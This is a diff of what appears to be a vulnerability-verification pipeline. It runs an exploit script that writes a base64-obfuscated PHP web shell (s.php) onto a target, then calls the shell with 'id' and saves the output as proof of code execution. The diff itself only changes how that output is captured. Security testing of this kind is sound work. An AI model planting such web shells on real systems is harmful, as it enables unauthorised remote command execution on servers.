@@ -22,12 +22,14 @@ steps:
       - python exploit.py -t http://${target_host}:${target_port} -c 'echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbImMiXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsiYyJdIC4gIiAyPiYxIiApOyB9 | base64 -d | tee s.php'
 
   - name: Check exploit result
-    image: curlimages/curl:latest
+    image: alpine:latest
     commands:
-      - curl -f -v http://${target_host}:${target_port}/s.php?c=id
+      - apk add curl
+      - curl -f -v -o output.txt http://${target_host}:${target_port}/s.php?c=id
     evidence:
       - name: command_output
-        type: output
+        type: file
+        path: output.txt
         regexp: uid=\d+\([-a-z0-9_]+\) gid=\d+\([-a-z0-9_]+\) groups=(?:,?\d+\([-a-z0-9_]+\))+
 
   - name: Report
